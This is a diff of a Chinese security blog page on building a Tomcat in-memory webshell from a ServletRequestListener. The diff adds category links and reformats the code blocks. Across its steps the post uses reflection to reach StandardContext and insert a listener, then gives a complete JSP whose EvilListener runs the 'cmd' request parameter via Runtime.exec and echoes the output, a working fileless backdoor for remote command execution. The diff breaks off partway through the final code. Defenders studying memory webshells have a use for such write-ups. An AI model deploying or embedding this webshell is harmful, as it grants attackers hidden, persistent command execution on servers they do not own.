@@ -88,6 +88,10 @@
           <a href="/archives/">Archives</a>
         </li>
       
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
         <li class="nav-item" data-path="/tags/">
           <a href="/tags/">Tags</a>
         </li>
@@ -162,6 +166,23 @@
           2022-06-09 09:43:07
         </span>
         
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/Web-Security/" title="Web Security">
+                    <b>#</b> Web Security
+                  </a>
+                </span>
+                
+                <span class="span--category">
+                  <a href="/categories/Web-Security/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马">
+                    <b>#</b> Java内存马
+                  </a>
+                </span>
+                
+              </span>
+          
               <span class="post-tags">
                 <i class="iconfont icon-tags mr-10" title="Tags"></i>
                 
@@ -200,20 +221,20 @@
 </ul>
 <p>显而易见，我们选择使用ServletRequestListener类型的listener比较合适，因为其可以监听每次request的执行与销毁；</p>
 <h2 id="探究listener的注册与执行"><a href="#探究listener的注册与执行" class="headerlink" title="探究listener的注册与执行"></a>探究listener的注册与执行</h2><p>接下来，我们随意创建一个<code>TestListener</code></p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequestEvent</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequestListener</span></span><span class="token punctuation">;</span>
+<pre><code class="java">import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestListener</span> <span class="token keyword">implements</span> <span class="token class-name">ServletRequestListener</span> <span class="token punctuation">&#123;</span>
-    <span class="token annotation punctuation">@Override</span>
-    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestDestroyed</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestEvent</span> servletRequestEvent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+public class TestListener implements ServletRequestListener &#123;
+    @Override
+    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;
 
-    <span class="token punctuation">&#125;</span>
-    <span class="token annotation punctuation">@Override</span>
-    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestInitialized</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestEvent</span> servletRequestEvent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"evil code"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+    &#125;
+    @Override
+    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;
+        System.out.println(&quot;evil code&quot;);
+    &#125;
+&#125;
+</code></pre>
 <p>将他加入web.xml</p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229151841950.png" alt="image-20211229151841950"></p>
 <p>现在来探究一个正常的Listener被执行的流程</p>
@@ -223,10 +244,10 @@
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229152439542.png" alt="image-20211229152439542"></p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229152524318.png" alt="image-20211229152524318"></p>
 <p>继续跟进<code>findApplicationListeners()</code></p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">findApplicationListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>applicationListeners<span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="java">public String[] findApplicationListeners() &#123;
+    return this.applicationListeners;
+&#125;
+</code></pre>
 <p>由此可见，如果我们修改了<code>StandardContext</code>的<code>applicationListeners</code>属性，就可以让我们自己构造的恶意Listener加载进去。</p>
 <p>那么怎么能够获取到<code>StandardContext</code>呢？</p>
 <p>这里可能要一些前置知识：<strong>每一个项目都有一个ServletContext, ServletContext是全局共享的，也就是说所有的Servlet都可以访问这一个ServletContext，而ServletContext中往往保存上下文内可以访问的其他servlet的属性</strong></p>
@@ -237,18 +258,18 @@
 <p>获取后发现，servletContext中有一个applicationContext，其中包含了StandardContext，我们可以通过这里获取。</p>
 <h1 id="手动注册内存马"><a href="#手动注册内存马" class="headerlink" title="手动注册内存马"></a>手动注册内存马</h1><p>那么我们可以用反射的方式来获取到StandardContext</p>
 <p>Tomcat在处理jsp页面的时候，实际上创建一个servlet，并把jsp中的代码翻译生成到该servlet中，因此我们下面的演示直接在自己创建的<code>HomeServlet.java</code>中执行</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token class-name">Field</span> stdFiled<span class="token operator">=</span>servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-stdFiled<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token class-name">ApplicationContext</span> aplContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> stdFiled<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token class-name">Field</span> standardFld <span class="token operator">=</span> aplContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-standardFld<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> standardFld<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>aplContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="java">ServletContext servletContext = request.getServletContext();
+Field stdFiled=servletContext.getClass().getDeclaredField(&quot;context&quot;);
+stdFiled.setAccessible(true);
+ApplicationContext aplContext = (ApplicationContext) stdFiled.get(servletContext);
+Field standardFld = aplContext.getClass().getDeclaredField(&quot;context&quot;);
+standardFld.setAccessible(true);
+StandardContext standardContext = (StandardContext) standardFld.get(aplContext);
+</code></pre>
 <p>接下来我们依然要用反射的方式获取到其<code>applicationListeners</code>属性，并将我们的恶意Listener放在最前面</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> applicationEventListeners <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">.</span><span class="token function">getApplicationEventListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-applicationEventListeners<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TestListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
+<pre><code class="java">List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());
+applicationEventListeners.add(0,new TestListener());
+</code></pre>
 <p>到这里报错了</p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229154211578.png" alt="image-20211229154211578"></p>
 <p>看起来是add方法出了问题。</p>
@@ -256,100 +277,99 @@ applicationEventListeners<span class="token punctuation">.</span><span class="to
 <p>Array内部的ArrayList没有重写AbstractList的add（xxx），导致我们上诉代码调用的add（xxx）其实是直接调用AbstractList类的add（xxx），所以直接抛出了异常UnsupportedOperationException。</p>
 </blockquote>
 <p>那么直接换成ArrayList即可</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> applicationEventListeners <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">.</span><span class="token function">getApplicationEventListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> arrayList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span>applicationEventListeners<span class="token punctuation">)</span><span class="token punctuation">;</span>
-arrayList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TestListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="java">List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());
+List&lt;Object&gt; arrayList = new ArrayList(applicationEventListeners);
+arrayList.add(0,new TestListener());
+</code></pre>
 <p>最后将新建的arrayList重新赋值给<code>applicationEventListeners</code>，恰好有个这样的方法</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java">standardContext<span class="token punctuation">.</span><span class="token function">setApplicationEventListeners</span><span class="token punctuation">(</span>arrayList<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<pre><code class="java">standardContext.setApplicationEventListeners(arrayList.toArray());
+</code></pre>
 <p><strong>整个注册内存马的过程：</strong></p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token class-name">Field</span> stdFiled<span class="token operator">=</span>servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-stdFiled<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token class-name">ApplicationContext</span> aplContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> stdFiled<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token class-name">Field</span> standardFld <span class="token operator">=</span> aplContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-standardFld<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> standardFld<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>aplContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<pre><code class="java">ServletContext servletContext = request.getServletContext();
+Field stdFiled=servletContext.getClass().getDeclaredField(&quot;context&quot;);
+stdFiled.setAccessible(true);
+ApplicationContext aplContext = (ApplicationContext) stdFiled.get(servletContext);
+Field standardFld = aplContext.getClass().getDeclaredField(&quot;context&quot;);
+standardFld.setAccessible(true);
+StandardContext standardContext = (StandardContext) standardFld.get(aplContext);
 
-<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> applicationEventListeners <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">.</span><span class="token function">getApplicationEventListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> arrayList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span>applicationEventListeners<span class="token punctuation">)</span><span class="token punctuation">;</span>
-arrayList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TestListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-standardContext<span class="token punctuation">.</span><span class="token function">setApplicationEventListeners</span><span class="token punctuation">(</span>arrayList<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());
+List&lt;Object&gt; arrayList = new ArrayList(applicationEventListeners);
+arrayList.add(0,new TestListener());
+standardContext.setApplicationEventListeners(arrayList.toArray());
+</code></pre>
 <h1 id="构造恶意内存马"><a href="#构造恶意内存马" class="headerlink" title="构造恶意内存马"></a>构造恶意内存马</h1><p>构造内存马，直接把上面的注册过程写到jsp页面，然后在jsp页面写一个<code>&lt;%! 方法%&gt;</code>就可以了。</p>
 <p>需要注意的是，重写的<code>ServletRequestListener</code>的类方法<code>public void requestInitialized(ServletRequestEvent servletRequestEvent)</code>中，只有参数<code>servletRequestEvent</code>，而没有response。 如果我们想使用内存马，最好是能够有回显。</p>
 <p>在<strong>Request</strong>类中，我们可以得到response，而Request类是<strong>RequestFacade</strong>类中的属性<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229165853415.png" alt="image-20211229165853415"></p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229165807812.png" alt="image-20211229165807812"></p>
 <p>只要能够得到RequestFacade中的request属性，就能得到response object，所以我们直接用反射的方法来完成。</p>
 <p><strong>完整构造</strong>：</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.IOException"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.InputStream"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationContext"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardContext"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.List"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.Arrays"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.ArrayList"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.connector.Request"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.connector.RequestFacade"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">--</span>
-  <span class="token class-name">Created</span> by <span class="token class-name">IntelliJ</span> <span class="token class-name">IDEA<span class="token punctuation">.</span>
-  User</span><span class="token operator">:</span> leihehe
-  <span class="token class-name">Date</span><span class="token operator">:</span> <span class="token number">29</span><span class="token operator">/</span><span class="token number">12</span><span class="token operator">/</span><span class="token number">2021</span>
-  <span class="token class-name">Time</span><span class="token operator">:</span> <span class="token number">15</span><span class="token operator">:</span><span class="token number">52</span>
-  <span class="token class-name">To</span> change <span class="token keyword">this</span> template use <span class="token class-name">File</span> <span class="token operator">|</span> <span class="token class-name">Settings</span> <span class="token operator">|</span> <span class="token class-name">File</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span>
-<span class="token operator">--</span><span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span>
+<pre><code class="java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;java.util.List&quot; %&gt;
+&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;
+&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.RequestFacade&quot; %&gt;
+&lt;%--
+  Created by IntelliJ IDEA.
+  User: leihehe
+  Date: 29/12/2021
+  Time: 15:52
+  To change this template use File | Settings | File Templates.
+--%&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%!
 
-    <span class="token keyword">class</span> <span class="token class-name">EvilListener</span> <span class="token keyword">implements</span> <span class="token class-name">ServletRequestListener</span><span class="token punctuation">&#123;</span>
+    class EvilListener implements ServletRequestListener&#123;
 
-        <span class="token annotation punctuation">@Override</span>
-        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestDestroyed</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestEvent</span> servletRequestEvent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        @Override
+        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;
 
-        <span class="token punctuation">&#125;</span>
+        &#125;
 
-        <span class="token annotation punctuation">@Override</span>
-        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestInitialized</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestEvent</span> servletRequestEvent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-                <span class="token class-name">ServletRequest</span> servletRequest <span class="token operator">=</span> servletRequestEvent<span class="token punctuation">.</span><span class="token function">getServletRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token class-name">String</span> cmd <span class="token operator">=</span> servletRequest<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token class-name">RequestFacade</span> requestFacade <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RequestFacade</span><span class="token punctuation">)</span> servletRequest<span class="token punctuation">;</span>
-                <span class="token class-name">Field</span> requestField <span class="token operator">=</span> requestFacade<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                requestField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token class-name">Request</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span>requestField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>requestFacade<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">=</span>inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-                    request<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                    request<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token punctuation">&#125;</span>
-            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> <span class="token class-name">NoSuchFieldException</span> <span class="token operator">|</span> <span class="token class-name">IllegalAccessException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
+        @Override
+        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;
+            try &#123;
+                ServletRequest servletRequest = servletRequestEvent.getServletRequest();
+                String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+                RequestFacade requestFacade = (RequestFacade) servletRequest;
+                Field requestField = requestFacade.getClass().getDeclaredField(&quot;request&quot;);
+                requestField.setAccessible(true);
+                Request request = (Request)requestField.get(requestFacade);
+                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
+                int i = 0;
+                byte[] bytes = new byte[1024];
+                while ((i=inputStream.read(bytes)) != -1)&#123;
+                    request.getResponse().getWriter().write(new String(bytes,0,i));
+                    request.getResponse().getWriter().write(&quot;\r\n&quot;);
+                &#125;
+            &#125; catch (IOException | NoSuchFieldException | IllegalAccessException e) &#123;
+                e.printStackTrace();
+            &#125;
+        &#125;
+    &#125;
 
-<span class="token operator">%</span><span class="token operator">></span>
+%&gt;
 
-<span class="token operator">&lt;</span><span class="token operator">%</span>
-    <span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token class-name">Field</span> stdFiled<span class="token operator">=</span>servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    stdFiled<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token class-name">ApplicationContext</span> aplContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> stdFiled<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token class-name">Field</span> standardFld <span class="token operator">=</span> aplContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    standardFld<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> standardFld<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>aplContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
+&lt;%
+    ServletContext servletContext = request.getServletContext();
+    Field stdFiled=servletContext.getClass().getDeclaredField(&quot;context&quot;);
+    stdFiled.setAccessible(true);
+    ApplicationContext aplContext = (ApplicationContext) stdFiled.get(servletContext);
+    Field standardFld = aplContext.getClass().getDeclaredField(&quot;context&quot;);
+    standardFld.setAccessible(true);
+    StandardContext standardContext = (StandardContext) standardFld.get(aplContext);
 
-    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> applicationEventListeners <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">.</span><span class="token function">getApplicationEventListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
